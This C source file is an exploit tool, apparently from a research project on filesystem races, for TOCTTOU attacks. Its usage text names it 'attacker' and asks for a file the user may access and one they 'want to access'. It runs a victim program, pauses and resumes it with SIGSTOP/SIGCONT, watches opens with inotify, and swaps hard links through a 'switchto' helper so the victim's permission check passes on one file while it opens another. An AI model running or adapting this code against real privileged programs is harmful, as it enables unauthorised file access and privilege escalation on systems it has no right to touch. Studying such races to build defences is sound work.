#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/inotify.h>


//int inotify_init(void);
//int inotify_add_watch(int fd, const char *path, __u32 mask);
int get_event (int fd, const char * target);
int krounds;

char *filenames[1<<25];
int nfilenames;

struct stat test;
struct timespec rqtp;
struct timespec rmtp;

struct timeval tv;

long long tv2usecs(struct timeval *tv)
{
	return tv->tv_sec * 1000000ULL + tv->tv_usec;
}

void load_filenames(char *namelistfile)
{
	FILE *f;
	
	if ((f = fopen(namelistfile, "r")) == NULL) {
		perror("Couldn't open filename list file");
		exit(1);
	}
	nfilenames = 0;
	while(fscanf(f, "%as\n", &filenames[nfilenames]) != EOF)
		nfilenames++;
}

#define OP_CREATE 0
#define OP_DELETE 1

int semid;
int nfiles;
int current_operation;
int current_filename;
char *current_target;

/* Allow for 1024 simultanious events */
#define BUFF_SIZE ((sizeof(struct inotify_event)+FILENAME_MAX)*1024)

int get_event (int fd, const char * target){

   ssize_t len, i = 0;
//   char action[81+FILENAME_MAX] = {0};
   char buff[BUFF_SIZE] = {0};

   len = read (fd, buff, BUFF_SIZE);
   
   while (i < len) {
      struct inotify_event *pevent = (struct inotify_event *)&buff[i];
      char action[81+FILENAME_MAX] = {0};

      if (pevent->len) 
         strcpy (action, pevent->name);
      else
         strcpy (action, target);
    
      if (pevent->mask & IN_ACCESS) 
         strcat(action, " was read");
      if (pevent->mask & IN_ATTRIB) 
         strcat(action, " Metadata changed");
      if (pevent->mask & IN_CLOSE_WRITE) 
         strcat(action, " opened for writing was closed");
      if (pevent->mask & IN_CLOSE_NOWRITE) 
         strcat(action, " not opened for writing was closed");
      if (pevent->mask & IN_CREATE) 
         strcat(action, " created in watched directory");
      if (pevent->mask & IN_DELETE) 
         strcat(action, " deleted from watched directory");
      if (pevent->mask & IN_DELETE_SELF) 
         strcat(action, "Watched file/directory was itself deleted");
      if (pevent->mask & IN_MODIFY) 
         strcat(action, " was modified");
      if (pevent->mask & IN_MOVE_SELF) 
         strcat(action, "Watched file/directory was itself moved");
      if (pevent->mask & IN_MOVED_FROM) 
         strcat(action, " moved out of watched directory");
      if (pevent->mask & IN_MOVED_TO) 
         strcat(action, " moved into watched directory");
      if (pevent->mask & IN_OPEN) {
		gettimeofday(&tv, NULL);
		printf("%18lld OPEN OCCURED\n", tv2usecs(&tv));
		return 0;	
	  }
   /*
      printf ("wd=%d mask=%d cookie=%d len=%d dir=%s\n",
              pevent->wd, pevent->mask, pevent->cookie, pevent->len, 
              (pevent->mask & IN_ISDIR)?"yes":"no");

      if (pevent->len) printf ("name=%s\n", pevent->name);
   */

      printf ("%s\n", action);
      
      i += sizeof(struct inotify_event) + pevent->len;

   }
	return 1;
}  /* get_event */


void * threadfunc(void * dummy)
{
	struct sembuf sop;

	sop.sem_num = 0;
	sop.sem_op = -1;
	sop.sem_flg = 0;

	while (1) {

		if (semop(semid, &sop, 1)) {
			perror("Couldn't sleep on semaphore\n");
			pthread_exit(NULL);
		}

		switch (current_operation) {

		case OP_CREATE:
			link(current_target, filenames[current_filename++]);
			break;

		case OP_DELETE:
			unlink(filenames[--current_filename]);
			break;

		default:
			fprintf(stderr, "Unknown current_operation\n");
		}
		
		if (current_filename == 0)
			current_operation = OP_CREATE;
	}

	return NULL;
}

pthread_t threads[1<17];



void firstswitchto (int method, pid_t victimpid, char *tgt)
{
		struct timeval tv;
		int i;
		
		

		if (victimpid && kill(victimpid, SIGSTOP)) {
			perror("Couldn't stop victim");
			exit(1);
		}
		gettimeofday(&tv, NULL);
		printf("%18lld STOPPED\n", tv2usecs(&tv));
		
	
		for (i = nfiles - 1; i >= 0; i--)
			unlink(filenames[i]); // Ignore failures here
			
		if (link(tgt, filenames[nfiles-1])) {
				perror("Couldn't create link");
				exit(1);
			}


		gettimeofday(&tv, NULL);
		printf("%18lld CONTED\n", tv2usecs(&tv));
		
		
		
		if (victimpid &&	kill(victimpid, SIGCONT)) {
			perror("Couldn't continue victim");
			exit(1);
		}
}


int main(int argc, char **argv)
{
	int debug;
	int sched;
	char *namelistfile;
	char *basedir;
	char *goodfile;
	char *badfile;
	char *victim_args[argc];
	int i;
	pid_t victimpid = 0;

	krounds=0;
	char* switch_args[7];
	char temp[500];
	char temp2[500];
	char temp3[500];
	char pwd[500];
	
	
	if (argc < 8) {
		printf("attacker <debug> <sched> <namelist> <basedir> <nfiles> <goodfile> <badfile> <victim> <victim args>\n"
					 "debug:       0 = no debugging, 1 = debugging\n"
					 "sched:       0 = suspend victim to do work\n"
					 "             1 = use many threads to do work (experimental)\n"
					 "namelist:    name of file containing list of filenames to use\n"
					 "basedir:     attack files will be created in this directory\n"
					 "nfiles:      number of files to be used in attacks\n"
					 "goodfile:    the file you are allowed to access\n"
					 "badfile:     the file you want to access\n"
					 "victim:      victim executable\n"
					 "\n"
					 "Note: victim will be executed a \"victim victim_args path\n"
					 "Note: goodfile, badfile, victim, and victim's arguments\n"
					 "      must be absolute paths or relative to basedir.\n");
		
		exit(0);
	}

	debug = atoi(argv[1]);
	sched = atoi(argv[2]);
	namelistfile = argv[3];
	basedir = argv[4];
	nfiles = atoi(argv[5]);
	goodfile = argv[6];
	badfile = argv[7];
	for (i = 0; i < argc - 8; i++)
    victim_args[i] = argv[i + 8];
	load_filenames(namelistfile);
//  	victim_args[i++] = filenames[0];
 	victim_args[i++] = filenames[nfiles-1];
  	victim_args[i++] = NULL;

	if (sched) {
		if ((semid = semget(12323, 1, IPC_CREAT | S_IRWXU)) < 0) {
			perror("Couldn't set up semaphore\n");
			exit(0);
		}
		if (semctl(semid, 0, SETVAL, 0) < 0) {
			perror("Couldn't init semaphore\n");
			exit(0);
		}
		for (i = 0; i < 2*nfiles; i++)
			if (pthread_create(&threads[i], NULL, threadfunc, NULL) != 0) {
				perror("Couldn't create thread\n");
				exit(0);
			}
		sleep(1);
	}
	
	memset(pwd,'\0',500);
	getcwd(pwd,500);
	
	memset(temp3,'\0',500);
	getcwd(temp3,500);


	if (chdir(basedir)) {
		perror("Couldn't switch to basedir");
		exit(1);
	}


	firstswitchto(sched, victimpid, badfile);	
	if (sched)
		sleep(1);
	
//	printf("after first switch filename= %s\n",filenames[nfiles-1]);
		
//	unsigned long mask=1;
//	unsigned int len = sizeof(mask);
	
//	if (sched_setaffinity(0, len, &mask) < 0) {
//    	perror("sched_setaffinity");
//	}
	
	rqtp.tv_sec=0;
	rqtp.tv_nsec=10;	
	
	/*
	  switch_args[0]: $PWD/switchto
	  switch_args[1]: nfiles
	  switch_args[2]: krounds
	  switch_args[3]: namelistfile
	  switch_args[4]: tgt
	  switch_args[5]: "s" or "ls"
	  switch_args[6]: victimpid
	*/
	
	
//	printf("get here: before assignment\n");
	
//	switch_args[0]="/home/xcai/project/raceproject/races2/switchto";
	
	strcat(pwd,"/switchto");
	switch_args[0]=pwd;
		

	switch_args[1]=argv[5];

	memset(temp2,'\0',500);
	sprintf(temp2, "%d", krounds);
	switch_args[2]=temp2;
	
	strcat(temp3,"/");
	strcat(temp3,argv[3]);
	switch_args[3]=temp3;
	switch_args[4]=switch_args[5]=switch_args[6]=NULL;
	

//	printf("switch_args:\n [0] is %s\n[1] is %s\n[2] is %s\n[3] is %s\n[4] is %s\n[5] is %s\n[6] is %s\n",switch_args[0],switch_args[1],switch_args[2],switch_args[3],switch_args[4],switch_args[5],switch_args[6]);

//	printf("get here: before vic fork\n");
	

	victimpid=fork();
	
	
	if(victimpid==0){
		
		sched_yield();
		nice(100);
    	execvp(victim_args[0], victim_args);
    	perror("execvp");
    	return 1;
	}
	
	else if (victimpid == -1) {
		perror("Couldn't fork");
		exit(1);
	}

	
	
	unsigned long long x1;
	unsigned long long x2;
	
	gettimeofday(&tv, NULL);
	x1=tv2usecs(&tv);
	
		
	if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
		
	gettimeofday(&tv, NULL);
	x2=tv2usecs(&tv);
	
//	printf("%18lld before nanosleep\n%18lld after nanosleep\n",x1,x2);

	unsigned long long a1=0;
//	unsigned long long a2=0;
//	unsigned long long a3=0;
 	
 	pid_t chpid;
 	int status;
	
	memset(temp,'\0',500);
 	sprintf(temp, "%d", victimpid);
	switch_args[6]=temp;
	
	while(1) {
		// VICTIM: lstat
		gettimeofday(&tv, NULL);
		a1=tv2usecs(&tv);
		
		
		if (victimpid && kill(victimpid, SIGSTOP)) {
			perror("Couldn't stop victim");
			exit(1);
		}
		gettimeofday(&tv, NULL);
		printf("%18lld STOPPED2\n", tv2usecs(&tv));


		switch_args[4]=goodfile;
		switch_args[5]="s";
		
		chpid=fork();
	
	//	printf("switch_args[0] is %s\n",switch_args[0]);
	
		if(chpid==0){
		//	printf("victim[0] is %s\n",victim_args[0]);
			execvp(switch_args[0], switch_args);
    		perror("execvp");
    		return 1;
		}
	
		else if (chpid == -1) {
			perror("Couldn't fork");
			exit(1);
		}
	
		waitpid(chpid, &status, WUNTRACED | WCONTINUED);
		
//		exit(0);

		gettimeofday(&tv, NULL);
		printf("%18lld CONTED2\n", tv2usecs(&tv));	
		
		
		if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");	
		
		if (victimpid &&	kill(victimpid, SIGCONT)) {
			perror("Couldn't continue victim");
			exit(1);
		}
		
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
	

		
		if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
		
		// VICTIM: access
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);
		
//		printf("%18lld before nanosleep\n%18lld after nanosleep\n",x1,x2);
		

		if(victimpid && kill(victimpid,SIGSTOP)){
			perror("Couldn't stop victim");
			exit(1);
		}
		gettimeofday(&tv, NULL);
		printf("%18lld STOPPED3\n", tv2usecs(&tv));

                int fd;
                fd = inotify_init();
				
				gettimeofday(&tv, NULL);
//				printf("%18lld New inotify instance created\n", tv2usecs(&tv));
                
				if (fd<0) {
                        perror("inotify_init"); exit(2);
                }

                int wd;

                wd = inotify_add_watch (fd, badfile, IN_OPEN | IN_ONESHOT);
				
				gettimeofday(&tv, NULL);
//				printf("%18lld Watching!\n", tv2usecs(&tv));
                
				if (wd<0) {
                        perror("inotify_add_watch"); exit(2);
                        }

		switch_args[4]=badfile;
		switch_args[5]="s";
		chpid=fork();

		if(chpid==0){
			execvp(switch_args[0],switch_args);
    		perror("execvp");
    		return 1;
		}
	
		else if (chpid == -1) {
			perror("Couldn't fork");
			exit(1);
		}
	
		waitpid(chpid, &status, WUNTRACED | WCONTINUED);
		
		
		gettimeofday(&tv, NULL);		
		printf("%18lld CONTED3\n", tv2usecs(&tv));
		
/*		
		if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
*/				
		if (victimpid &&	kill(victimpid, SIGCONT)) {
			perror("Couldn't continue victim");
			exit(1);
		}
		
		while (get_event(fd, badfile));
		
		 
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		

/*		
		if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
		// VICTIM: open
*/
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);

//		printf("%18lld before nanosleep\n%18lld after nanosleep\n",x1,x2);


		if(victimpid && kill(victimpid,SIGSTOP)){
			perror("Couldn't stop victim");
			exit(1);
		}
		gettimeofday(&tv, NULL);
		printf("%18lld STOPPED4\n", tv2usecs(&tv));



		krounds++;
	
		memset(temp2,'\0',500);
		sprintf(temp2, "%d", krounds);
		switch_args[2]=temp2;
	
		switch_args[4]=badfile;
		switch_args[5]="ls";
		chpid=fork();
	
		if(chpid==0){
			execvp(switch_args[0],switch_args);
    		perror("execvp");
    		return 1;
		}
	
		else if (chpid == -1) {
			perror("Couldn't fork");
			exit(1);
		}
	
		waitpid(chpid, &status, WUNTRACED | WCONTINUED);
		
		gettimeofday(&tv, NULL);		
		printf("%18lld CONTED4\n", tv2usecs(&tv));
		
		if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
				
		if (victimpid &&	kill(victimpid, SIGCONT)) {
			perror("Couldn't continue victim");
			exit(1);
		}
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);

		
		if(0!=nanosleep(&rqtp,&rmtp))
			perror("cannot nanosleep!!!");
			
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);

//		printf("%18lld before nanosleep\n%18lld after nanosleep\n",x1,x2);
		
	//	printf("after second switch filename= %s\n",filenames[nfiles-1]);
	//	printf("%18lld should after lstate\n%18lld should after access\n%18lld should after open\n",a1,a2,a3);
		
	//	sched_yield();
		// VICTIM: fstat
		// VICTIM: close (except on first iteration)
		
	//	exit(0);
	}

	return 0;
}
